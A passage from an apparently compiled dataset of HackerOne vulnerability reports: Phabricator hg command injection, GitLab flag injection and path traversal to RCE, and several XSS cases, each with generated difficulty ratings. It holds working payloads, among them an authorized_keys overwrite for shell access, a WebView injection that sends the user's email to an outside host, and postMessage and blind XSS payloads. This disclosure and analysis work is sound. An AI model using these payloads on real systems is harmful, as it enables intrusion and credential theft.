6[URL]... Try `wget --help' for more options. abort: pre-log hook exited with status 1
The root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.
Thanks!



================================================================================
Vulnerability Description:
A command injection vulnerability in Phabricator allows an attacker to execute arbitrary commands by creating a maliciously named Mercurial branch. The branch name is injected directly into the 'hg' command, defining a hook that runs before the 'hg log' command is executed.

Steps to Reproduce:
1. Monitor a remote Mercurial repo with Phabricator
2. Create a branch named '--config=hooks.pre-log=wget' on the remote repo
3. Wait for Phabricator to update the remote repo
4. Visit the history page of the crafted branch: http://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/
Exploitation Difficulty:
The vulnerability requires understanding of Mercurial branch naming conventions and hook configurations, as well as how Phabricator processes remote repositories. The interaction between the branch name and command execution is non-obvious but doesn't involve multiple complex components or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/682442: Git flag injection - Search API with scope 'blobs' 
================================================================================
RAW DESCRIPTION:

As requested from @hackerjuan, breaking this out of https://hackerone.com/reports/658013 for easier tracking.
Summary
Gitlab 12.1.6 fixed the wiki_blobs scope of the search api, but the blobs scope is still vulnerable to git flag injection and allows reading any file in /var/opt/gitlab/gitaly including config.toml.
Steps to reproduce
Make a search API call setting the ref parameter to --no-index, search to a common character such as . or a, and scope to blobs:
Code 887 Bytes
1curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index
2
3[{"basename":null,"data":"VERSION\u00001\u0000Gitaly, version 1.53.2\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4},{"basename":null,"data":"config.toml\u00001\u0000# Gitaly configuration file\nconfig.toml\u00002\u0000# This file is managed by gitlab-ctl. Manual changes will be\nconfig.toml\u00003\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\nconfig.toml\u00004\u0000# and run:\nconfig.toml\u00005\u0000# sudo gitlab-ctl reconfigure\nconfig.toml\u00006\u0000\nconfig.toml\u00007\u0000socket_path = '/var/opt/gitlab/gitaly/gitaly.socket'\nconfig.toml\u00008\u0000bin_dir = '/opt/gitlab/embedded/bin'\nconfig.toml\u00009\u0000\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4}]
The ref parameter ends up being passed to git grep and setting it to --no-index includes the current working directory and files not managed by git:
Code 269 Bytes
1/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index
Impact
The config.toml can contain sensitive information, api keys and tokens. For example on gitlab.com it contain the sentry.io api tokens as well as the gitaly token:
Code 335 Bytes
1https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index
2
3sentry_dsn = 'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16
4ruby_sentry_dsn = 'https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29
5
6token = 'yfZTE0Oxxxxxxx'
I haven't looked into what is possible with the above tokens as potentially there is sensitive information in sentry.io.
Let me know if you have any questions or require any other information.
Cheers,
Will
Impact
Read access to any file in /var/opt/gitlab/gitaly including config.toml which may contain sensitive information, tokens, and API keys



================================================================================
Vulnerability Description:
Git flag injection in the search API with scope 'blobs' allows reading any file in /var/opt/gitlab/gitaly, including config.toml which may contain sensitive information like API keys and tokens.

Steps to Reproduce:
1. Make a search API call setting the ref parameter to --no-index, search to a common character such as . or a, and scope to blobs
2. The ref parameter ends up being passed to git grep and setting it to --no-index includes the current working directory and files not managed by git
Exploitation Difficulty:
The vulnerability involves understanding how the ref parameter is passed to git grep and how the --no-index flag affects the search behavior. While the interaction is non-obvious, the attack itself is straightforward once the flag injection is discovered.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/733072: Path traversal, to RCE
================================================================================
RAW DESCRIPTION:

Summary
This one is similar to #732330 but much simpler.
A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.
Steps to reproduce
Enable package registry in your GitLab instance.
Create a project (package registry is enabled by default)
Create a private token to call the API
Send the following request
Code 302 Bytes
1curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
Then run ssh git@10.26.0.5 to enjoy a shell.
Examples
<image_0>
In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.
Results of GitLab environment info
Code 853 Bytes
1$ gitlab-rake gitlab:env:info
2
3System information
4System:		
5Proxy:		no
6Current User:	git
7Using RVM:	no
8Ruby Version:	2.6.3p62
9Gem Version:	2.7.9
10Bundler Version:1.17.3
11Rake Version:	12.3.3
12Redis Version:	3.2.12
13Git Version:	2.22.0
14Sidekiq Version:5.2.7
15Go Version:	unknown
16
17GitLab information
18Version:	12.4.2-ee
19Revision:	a3170599aa2
20Directory:	/opt/gitlab/embedded/service/gitlab-rails
21DB Adapter:	PostgreSQL
22DB Version:	10.9
23URL:		http://10.26.0.5
24HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
25SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
26Elasticsearch:	no
27Geo:		no
28Using LDAP:	no
29Using Omniauth:	yes
30Omniauth Providers: 
31
32GitLab Shell
33Version:	10.2.0
34Repository storage paths:
35- default: 	/var/opt/gitlab/git-data/repositories
36GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
37Git:		/opt/gitlab/embedded/bin/git
Code 543 Bytes
1# my docker-compose.yml
2version: '3'
3services:
4  web:
5    image: 'gitlab/gitlab-ee:latest'
6    restart: always
7    hostname: 'localhost'
8    environment:
9      GITLAB_OMNIBUS_CONFIG: |
10        external_url 'http://10.26.0.5'
11        gitlab_rails['packages_enabled'] = true
12    ports:
13      - '10.26.0.5:80:80'
14  #    - '10.26.0.5:22:22'
15    volumes:
16      - './config:/etc/gitlab'
17      - './logs:/var/log/gitlab'
18      - './data:/var/opt/gitlab'
19      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)
Impact
This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.



================================================================================
Vulnerability Description:
A path traversal vulnerability in GitLab's package registry API allows an attacker to write arbitrary files to any location writable by the GitLab user, potentially leading to remote code execution by overwriting critical files like authorized_keys.

Steps to Reproduce:
1. Enable package registry in your GitLab instance and create a project (package registry is enabled by default).
2. Create a private token to call the API and send a crafted request with path traversal to write a file (e.g., authorized_keys) to a sensitive location.
Exploitation Difficulty:
The vulnerability involves a straightforward path traversal attack with no complex interactions or state manipulations required. The attack vector is well-known and the steps to exploit are simple and linear.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - DOM Vulnerabilities (5 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1343300: com.basecamp.bc3 Webview Javascript Injection and JS bridge takeover
================================================================================
RAW DESCRIPTION:

It was identified that the android com.basecamp.bc3 application, contains a Webview where the loaded URLs are not sanitised properly. As this webview's functionality is extended via javascript interfaces and has the javascript enabled it is possible to inject arbitrary javascript code which will be executed by the application's webview and provide access to the java native code via the class a.a.a.s.g ( which is exposed via the NativeApp).
JS Bridge
The following JS Bridges are exposed:
nativeBridge
<image_0>
NativeApp
<image_1>
TurboNative
<image_2>
Steps to Reproduce
Create a valid basecamp account
Create a project
<image_3>
Open any Sub-project tab (e.g. Message Board - it is needed only ONE time in order to initialise the JS interface )
Run the following command after replacing the XXXXX with the user id
<image_4>
Command:
Code 221 Bytes
1$adb shell am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'
Observer the HTTP requests of the app:
Code 69 Bytes
1GET /?exfiltration=USER_EMAIL@gmail.com HTTP/2
2Host: example.com
3....
Impact
Confidentiality, Integrity and availability are all affected from the specific vulnerability as the javascript code can be injected to an already loaded url while additional functionality is added via the exposed javascript interfaces:
Javascript Injection:
<image_5>
Bridge Access
"Bucket Name:"+nativeBridge.getPage().bucketName + "Title: " + nativeBridge.getPage().title + "User email:" +nativeBridge.getPage().accountName);
<image_6>
Cookie exfiltration:
<image_7>



================================================================================
Vulnerability Description:
The Android com.basecamp.bc3 application contains a WebView with improperly sanitized URLs, enabling arbitrary JavaScript injection. This allows access to native Java code via exposed JS bridges (nativeBridge, NativeApp, TurboNative), leading to data exfiltration (e.g., account names, bucket names, cookies) and potential integrity/availability compromise.

Steps to Reproduce:
1. Create a valid Basecamp account and a project.
2. Open any Sub-project tab (e.g., Message Board) to initialize the JS interface.
3. Run the command: `adb shell am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'` after replacing XXXXX with the user ID.
4. Observe the HTTP requests to confirm data exfiltration (e.g., user email).
Exploitation Difficulty:
The vulnerability involves multiple components (WebView, JS bridges, URL manipulation) and requires understanding how the app initializes and exposes interfaces. However, the attack chain is linear once the JS bridge methods are identified, and the injection technique is standard for WebView flaws.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1758132: xss due to incorrect handling of postmessages
================================================================================
RAW DESCRIPTION:

Due to Insecure handling of create link tags (a tags) in a function called autolink found in 7Bmt.af733e428f9f986dfc96.js
Code 661 Bytes
1e = n.autolink(e, !0));
2        const n = function() {
3            const e = /\b(?:(?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>&]+|&amp;|\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\))+(?:\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’&]))/gi;
4            return {
5                autolink: function(t, r) {
6                    return t.replace(e, (function(e) {
7                        /^https?:\/\//.test(e) || (e = "http://" + e);
8                        return "<a " + (r ? 'rel="nofollow"' : "") + ' href="' + e + '">' + e + "</a>"
9                    }
10                    ))
11                }
12            }
13        }();
which is ran in the challenges (ex: https://www.khanacademy.org/computing/computer-programming/programming/resizing-with-variables/pc/challenge-brown-bear-eyes). A specially crafted postmessage can abuse this.
Code 983 Bytes
1<!DOCTYPE html>
2<html>
3    <head>
4        <meta charset="utf-8">
5        <title>New webpage</title>
6    </head>
7    <body>
8        <script>
9        function main()
10{
11	window['test']=window.open("https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania");
12	const pwntimer = setTimeout(pwn, 3000);	
13}
14function pwn(){window['test'].postMessage('{"results":{"timestamp":'+Date.now()+',"code":"","errors":[],"assertions":[],"warnings":[],"tests":[{"name":"","state":"pass","results":[{"type":"assertion","msg":"http://#/\\"style=\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\"onmouseover=\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\"","state":"pass","expected":"","meta":{"structure":"function() {pwned!}"}}]}]}}',"*");clearTimeout(pwntimer)};
15        </script>
16        <button onclick="main();">press to pwn</button>
17    </body>
18</html>
also due to insecure host checking in the message event, the mentioned html code above can be run from any webpage.
The payload which the function autolink is insecurely creating the tag can look like this
http://#/"style="width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;"onmouseover="eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))" the malicious link will be set incorrectly and create extra attributes (in this case style and onmouseover)
the parsed json payload:
Code 779 Bytes
1{
2   "results":{
3      "timestamp":"",
4      "code":"",
5      "errors":[
6         
7      ],
8      "assertions":[
9         
10      ],
11      "warnings":[
12         
13      ],
14      "tests":[
15         {
16            "name":"",
17            "state":"pass",
18            "results":[
19               {
20                  "type":"assertion",
21                  "msg":"http://#/\"style=\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\"onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\"",
22                  "state":"pass",
23                  "expected":"",
24                  "meta":{
25                     "structure":"function() {pwned!}"
26                  }
27               }
28            ]
29         }
30      ]
31   }
32}
Impact
This attack could be steal user data (cookies, profile, etc) which in turn can be used to manipulate the user account, if it is a teacher who gets targeted, it can cause havoc with the email ("106 assignments have been assigned") as well as leak student private info. This attack could also be used to create a phishing page with the domain khanacademy.org by modifying the page to display a login box (stealing the users email and password).



================================================================================
Vulnerability Description:
The vulnerability is a DOM-based XSS caused by insecure handling of postMessages and improper URL sanitization in the autolink function. The function creates anchor tags from URLs without properly escaping or validating the input, allowing injection of arbitrary HTML attributes including JavaScript event handlers.

Steps to Reproduce:
1. Create an HTML file with a script that opens a Khan Academy challenge page in a new window and sends a specially crafted postMessage payload after a delay.
2. The payload includes a malicious URL that exploits the autolink function to inject arbitrary HTML attributes into an anchor tag, including event handlers like onmouseover.
Exploitation Difficulty:
This vulnerability requires understanding of multiple components: the postMessage API, the autolink function's behavior, and how to craft a payload that bypasses URL parsing while still executing JavaScript. The interaction between postMessage handling and DOM manipulation is non-obvious, and the attack requires precise timing and payload construction.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/422043: H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing
================================================================================
RAW DESCRIPTION:

Hi Team!
I'm reporting a rather unusual DOMXSS that allows an attacker to perform a XSS attack on any Shopify apps that use the Embedded SDK. To exploit this, several techniques were chained together: Cookie Stuffing -> Login CSRF -> (Not Open) Redirect -> DOMXSS.
Details
Inspired by #381192, I decided to check all pages to see if there's any broken origin validation. The results were frustrating since they all seemed to be done properly. However I noticed embedded apps did it in a way that it verifies if the coming origin is the logged-in store. Say if I am an admin on foobar.myshopify.com, then an embedded app will check if in-coming messages originate from https://foobar.myshopify.com. I went ahead to look up some documentations, confirming this is by design (shopOrigin):
Code 84 Bytes
1ShopifyApp.init({
2  shopOrigin: 'https://CURRENT_LOGGED_IN_SHOP.myshopify.com'
3[...]
Now this is interesting because by design we can execute any JavaScript on our own stores. That means, I can iframe an embedded app on my store, then post any message to it and it will accept it. So I quickly beautify the SDK source code to see if there's any interesting event. Checking common DOMXSS sinks I found that it registers the Shopify.API.setWindowLocation event that navigates to a said destination.
https://cdn.shopify.com/s/assets/external/app.js
Code 292 Bytes
1e.setWindowLocation = function(e) {
2    return window.location = e
3}, e.bindWindowLocation = function() {
4    return _Shopify.Messenger.addHandler("Shopify.API.setWindowLocation", function(e) {
5        return function(t, n) {
6            return e.setWindowLocation(n)
7        }
8    }(this))
9}
By navigate to a javascript: pseudo URL it can lead to XSS. This can be verified by opening any embedded apps and execute the following code in the DevTools' console
Code 140 Bytes
1$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
<image_0>
However this XSS is almost useless because the embedded app is authenticated as us, the attacker. When we try to exploit it on a victim it won't work because they are not logged into our store. So you could say this is, a self DOMXSS. Well, almost.
What if we use Login CSRF to force a victim to be logged into our store? After the victim is logged in to our store, we can then instruct user's browser to log into the embedded app as us by navigating to /admin/oauth/authorize. Then the current logged in store will be ours. I came up with an idea to stuff the session cookies using JavaScript.
The session cookies consist of _secure_admin_session_id and _master_udr. While I could simply write _secure_admin_session_id with docuemnt.cookie API, I realized a problem with _master_udr. Unlike _secure_admin_session_id, _master_udr is scoped to .myshopify.com. If we triy to write our _master_udr, then this will happen:
Code 386 Bytes
1GET https://canvasfoobar.myshopify.com/admin/oauth/authorize?client_id=d25e45407e508f96409c2dd796e9bd95&redirect_uri=https%3A%2F%2Fscript-editor.shopifycloud.com%2Fauth%2Fshopify%2Fcallback&response_type=code&scope=write_scripts%2Cread_products%2Cread_customers&state=a HTTP/1.1
2Host: canvasfoobar.myshopify.com
3Cookie: _master_udr=LEGIT; _master_udr=EVIL; _secure_admin_session_id=EVIL
The legitimate _master_udr will override our evil one and the server will refuse to authenticate as us. There is a trick fortunately.
“Cookies with longer paths are listed before cookies with shorter paths.” –RFC 6265
By setting a cookie with a very specific (/admin/oauth in this case) we can outrun the original one. The code that we will use to force a login will be:
Code 124 Bytes
1document.cookie = '_secure_admin_session_id=EVIL;path=/admin/oauth';
2document.cookie = '_master_udr=EVIL;path=/admin/oauth';
Another problem is even after all this, the victim will be logged into the embedded app as us. That means, all actions only affect our store.
To solve this we can simply relog in the victim to the embedded app. Since the victim is still logged in their store, we can navigate the victim to https://victim.myshopify.com/admin/oauth/authorize to trigger the auth flow for the embedded app. The drawback is we need to know which store the victim is logged in as. Luckily https://www.shopify.com/path will redirect to the last logged in store of a user, therefore navigating to https://www.shopify.com/admin/oauth/authorize will lead them to https://victim.myshopify.com/admin/oauth/authorize.
Eventually we have our XSS running on the embedded app's domain running with the victim's session.
Steps to Reproduce
In the PoC, Script Editor will be used as an example.
Be logged into your store as an admin and have Script Editor installed
Navigate to https://canvasfoobar.myshopify.com/products/canary
After the iframe turns grey, click it
After a while, a fake modal dialog will show up and a New Script will be created
I'm also attaching a video demo.
Fix
I recommend fixing this issue by validating the URL for Shopify.API.setWindowLocation. The other small issues are by design so they are hard to fix.
Impact
Perform unauthorized actions on a store admin on any embedded apps.



================================================================================
Vulnerability Description:
This vulnerability is a DOM-based XSS in Shopify's Embedded SDK, which allows an attacker to execute arbitrary JavaScript in the context of any Shopify app using the SDK. The attack chains multiple techniques: cookie stuffing to force a victim to log into the attacker's store, login CSRF to authenticate the victim in the embedded app, and a DOMXSS via the Shopify.API.setWindowLocation method to execute malicious code.

Steps to Reproduce:
1. Log in to your Shopify store as an admin and install the Script Editor app.
2. Navigate to a product page (e.g., https://canvasfoobar.myshopify.com/products/canary) and wait for the iframe to turn grey, then click it.
3. Observe the fake modal dialog appearing and a new script being created without authorization.
Exploitation Difficulty:
The attack involves multiple complex components: cookie stuffing with path manipulation to override legitimate cookies, login CSRF to force authentication, and a DOMXSS via a non-obvious message handler in the Embedded SDK. The attacker must also understand the subtle interaction between cookie paths and session management, as well as the specific behavior of the Shopify.API.setWindowLocation method. The novel use of cookie stuffing combined with login CSRF and DOMXSS makes this a highly sophisticated attack.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/603764: DOM Based XSS via postMessage at https://inventory.upserve.com/login/
================================================================================
RAW DESCRIPTION:

Description
DOM based XSS is possible at https://inventory.upserve.com/login/ due to insecure origin checking when receiving a postMessage.
POC
Visit https://hq.upserve.com.████████/upserve_xss.html
Click link
View alert on https://inventory.upserve.com
Vulnerable Code
Code 439 Bytes
1window.addEventListener("message", function(e) {
2  if (~e.origin.indexOf("https://hq.upserve.com")) {
3    if (e.data && typeof e.data == "object") {
4      try {
5        if (e.data["exec"]) {
6          eval(e.data["exec"]);
7        }
8      } catch (err) {
9        console.log(err);
10      }
11    } else {
12      console.log("Non-object passed");
13    }
14  } else {
15    console.log("Incorrect origin: " + e.origin.toString());
16    return;
17  }
18});
The origin check simply determines if "https://hq.upserve.com" is anywhere in the origin so an origin like "https://hq.upserve.com.mydomain.com" will pass this check just fine.
Impact
Due to the page being a login page, login credentials could be logged and stolen when a victim goes to login.



================================================================================
Vulnerability Description:
DOM based XSS is possible at https://inventory.upserve.com/login/ due to insecure origin checking when receiving a postMessage. The origin check only verifies if 'https://hq.upserve.com' is present anywhere in the origin string, allowing malicious origins like 'https://hq.upserve.com.mydomain.com' to pass the check. This can lead to execution of arbitrary JavaScript in the context of the login page, potentially stealing credentials.

Steps to Reproduce:
1. Visit https://hq.upserve.com.████████/upserve_xss.html
2. Click the link to trigger the postMessage to https://inventory.upserve.com
Exploitation Difficulty:
The vulnerability involves understanding postMessage communication and origin validation. While the origin check flaw is subtle, the overall attack chain is straightforward once the insecure origin check is identified. The components (postMessage handler, origin check, eval) are common in web applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/998398: Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)
================================================================================
RAW DESCRIPTION:

Summary:
deparam function which parses location.hash in https://s.swiftypecdn.com/install/v2/st.js is vulnerable to prototype pollution.
There is a script gadget in the same js file which leads to XSS.
Steps To Reproduce:
Visit (Refresh if you don't see a pop up)
https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)
Root Cause
https://s.swiftypecdn.com/install/v2/st.js is the vulnerable file.
deparam function parses the location.hash incorrectly which leads to Prototype Pollution.
Code 1.17 KiB
1
2 t.deparam = h = function(e, n) {
3            var i = {}
4              , r = {
5                "true": !0,
6                "false": !1,
7                "null": null
8            };
9            return t.each(e.replace(/\+/g, " ").split("&"), function(e, o) {
10                var s, a = o.split("="), u = b(a[0]), c = i, h = 0, p = u.split("]["), f = p.length - 1;
11                if (/\[/.test(p[0]) && /\]$/.test(p[f]) ? (p[f] = p[f].replace(/\]$/, ""),
12                p = p.shift().split("[").concat(p),
13                f = p.length - 1) : f = 0,
14                2 === a.length)
15                    if (s = b(a[1]),
16                    n && (s = s && !isNaN(s) ? +s : "undefined" === s ? l : r[s] !== l ? r[s] : s),
17                    f)
18                        for (; h <= f; h++)
19                            u = "" === p[h] ? c.length : p[h],
20                            c = c[u] = h < f ? c[u] || (p[h + 1] && isNaN(p[h + 1]) ? {} : []) : s; //pollution here
21                    else
22                        t.isArray(i[u]) ? i[u].push(s) : i[u] !== l ? i[u] = [i[u], s] : i[u] = s;
23                else
24                    u && (i[u] = n ? l : "")
25            }),
26            i
27        }
28
Gadget found in the same js, which is very interesting gadget I found so far :xD
Code 404 Bytes
1
2    
3        pInstall._convertStringHooksToFunctions = function() {
4            var functionHooks = {};
5            $.each(this._userServerConfiguration.install.hooks, function(hookName, hookFunction) {
6                functionHooks[hookName] = eval(hookFunction) //eval everything in the object
7            }),
8            this._userServerConfiguration.install.hooks = functionHooks
9        }
10        
11
Impact:
XSS
Impact
XSS



================================================================================
Vulnerability Description:
The vulnerability is a Prototype Pollution leading to XSS on the Swiftype blog. The deparam function in the st.js file incorrectly parses the location.hash, allowing prototype pollution. A gadget in the same file uses eval on polluted properties, leading to arbitrary JavaScript execution.

Steps to Reproduce:
1. Visit the URL: https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)
2. Refresh the page if the alert popup does not appear immediately
Exploitation Difficulty:
The vulnerability requires understanding of prototype pollution, identifying the vulnerable parsing function, and finding a suitable gadget in the same file that can turn the pollution into XSS. While prototype pollution is a known issue, finding the specific gadget that enables XSS in this context adds complexity.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Generic Vulnerabilities (6 reports)
--------------------------------------------------

Report https://hackerone.com/reports/143139: upgrade Aspen on inside.gratipay.com to pick up CR injection fix
================================================================================
RAW DESCRIPTION:

1) Using IE11, open DevTools and start network capture
2) visit the following URL:
http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq
3) find a 'qwe' cookie set in the response
There is a 0x0d character injected, which can be used as a header
delimiter in IE.
To see this behaviour using Curl, you can use the following command:
curl -s -v 'http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq' 2>&1|less
Screenshots of Curl output and DevTools are attached.



================================================================================
Vulnerability Description:
The vulnerability involves a CR (Carriage Return) injection in the URL, which can be used to set arbitrary cookies in Internet Explorer 11. This occurs due to improper handling of the 0x0d character in the URL, which IE interprets as a header delimiter, allowing the injection of HTTP headers like Set-Cookie.

Steps to Reproduce:
1. Using IE11, open DevTools and start network capture
2. Visit the URL: http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq and observe the 'qwe' cookie set in the response
Exploitation Difficulty:
The attack is straightforward and does not involve multiple components or complex interactions. The vulnerability is discovered by simply crafting a URL with a CR injection and observing the response in IE11 or using curl. The interaction is not subtle and does not require manipulating complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1558010: Blind XSS in app.pullrequest.com/████████ via /reviews/ratings/{uuid}
================================================================================
RAW DESCRIPTION:

Summary:
Hi,
While researching PullRequest yesterday, I saw some "review" endpoints in web archive of "app.pullrequest.com". (http://web.archive.org/cdx/search/cdx?url=app.pullrequest.com/*&output=text&fl=original&collapse=urlkey)
One of them was https://app.pullrequest.com/reviews/ratings/6eaa6b75-b958-4530-ba46-0d00cbe74e0b/false , I went to that endpoint and filled the all fields with my blind XSS payload.
'"><img src=x id=█████ onerror=eval(atob(this.id))>
This payload sends an alert to my blind XSS application in ██████
Today (May 3, 2022, 6:09 pm UTC+3), I got a lot of alerts from https://app.pullrequest.com/███. I checked the report and I see it came from an PullRequest admin who checks reviews.
Here is a screenshot from the report :
███████
I checked the HTML source code and I see my payload reflected to Disliked_reviewers, Liked_reviewers and Reasons fields without any encoding.
You can also check the source code : █████████
Impact
Blind XSS in PullRequest admin portal
Regards,
Bugra



================================================================================
Vulnerability Description:
A blind XSS vulnerability exists in the PullRequest admin portal where user-supplied input in the review ratings form is reflected without proper encoding, allowing execution of arbitrary JavaScript when viewed by an admin.

Steps to Reproduce:
1. Locate a review endpoint in the web archive of 'app.pullrequest.com' (e.g., https://app.pullrequest.com/reviews/ratings/6eaa6b75-b958-4530-ba46-0d00cbe74e0b/false).
2. Submit a blind XSS payload (e.g., '"><img src=x id=█████ onerror=eval(atob(this.id))>') in all fields of the review form.
3. Monitor the blind XSS application for alerts, indicating the payload was executed by an admin.
Exploitation Difficulty:
The vulnerability involves straightforward exploitation of a reflected XSS payload in a web form, with no complex interactions or state manipulation required. The primary challenge was identifying the endpoint via web archive, which is a common reconnaissance technique.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/190870: Stored XSS on new Calling plugin (spreed)
================================================================================
RAW DESCRIPTION:

There's a stored xss vulnerability ....
Proof Of Concept :
<image_0>
Invite people to single call room.
<image_1>
Impact :
Admin user can be xssed via this method if admin uses browsers like IE.
Let me know if you need help in reproducing



================================================================================
Vulnerability Description:
There is a stored XSS vulnerability in the spreed (Calling plugin) where an attacker can inject a malicious script that gets stored and executed when an admin user views the affected page, especially in browsers like Internet Explorer.

Steps to Reproduce:
1. Invite people to a single call room in the spreed (Calling plugin).
2. Inject a malicious script payload that will be stored and executed when viewed by an admin user (particularly in browsers like IE).
Exploitation Difficulty:
The vulnerability is straightforward to exploit once the XSS vector is identified. It does not involve complex interactions or state manipulations, and the attack logic is common for stored XSS vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/191890: DOM Based XSS in Discourse Search
================================================================================
RAW DESCRIPTION:

Steps to Reproduce:
Load http://try.discourse.org 2.Now From Top Right Corner Click on Search Button
Enter payload their
Payload:
@<script>prompt(1337)</script>gmail.com
4: Now in new windows that opens click on advance search and The XSS will Occur :)
5: Now copy the link and send to victim there the XSS will Occur To
Thanks
Khizer Javed



================================================================================
Vulnerability Description:
This is a DOM-based XSS vulnerability in Discourse's search functionality. By injecting a malicious script into the search input, an attacker can execute arbitrary JavaScript in the context of the victim's browser session when they interact with the advanced search feature.

Steps to Reproduce:
1. Load http://try.discourse.org
2. Click on the search button in the top right corner
3. Enter the payload: @<script>prompt(1337)</script>gmail.com
4. Click on 'advanced search' in the new window that opens to trigger the XSS
5. Copy the link and send it to a victim to trigger the XSS in their browser
Exploitation Difficulty:
The vulnerability involves a straightforward injection of a script payload into a search input field, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require deep understanding of the application's internal state or complex interactions between components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/191909: XSS Vulnerability on Image link parser
================================================================================
RAW DESCRIPTION:

I found a XSS (Cross-Site Scripting) vulnerability, and it is present in the markdown parser when it tries to parse an image URL.
To reproduce the vulnerability you need to add a fake image url like:
http://host/path/to/image'onerror=alert(1);//.png
As you can see, we have an invalid image URL which finish with an image extension (PNG). By putting the ' we are able to break the "img" tag in which the image url is included by the parser and add custom code, allowing us to run Javascript code. A malicious user could use the $.getScript function to load a malicious script.
If you need more information about the vulnerability, please, feel free to reply.



================================================================================
Vulnerability Description:
The vulnerability is an XSS (Cross-Site Scripting) issue in the markdown parser when processing image URLs. By crafting a malicious image URL with an XSS payload, an attacker can break out of the 'img' tag and execute arbitrary JavaScript code.

Steps to Reproduce:
1. Create a markdown content with an image URL that includes an XSS payload, e.g., http://host/path/to/image'onerror=alert(1);//.png
2. Submit or render the markdown content in the vulnerable application
Exploitation Difficulty:
The attack is straightforward and involves a single component (the image URL in markdown). The interaction is obvious (breaking out of the 'img' tag with a quote), and the logic is commonly seen in XSS vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2010530: yelp.com XSS ATO (via login keylogger, link Google account)
================================================================================
RAW DESCRIPTION:

Summary:
yelp.com reflects the content of the cookie guvo in the html returned to the user. In some cases this value is not properly escaped, leading to XSS. This can be combined with another issue where the backend does not properly parse the user supplied cookies and allows us to smuggle a guvo cookie inside a cookie named yelpmainpaastacanary. The yelpmainpaastacanary cookie can be set by including a URL query parameter ?canary=[Cookie value] in any request to *.yelp.com.
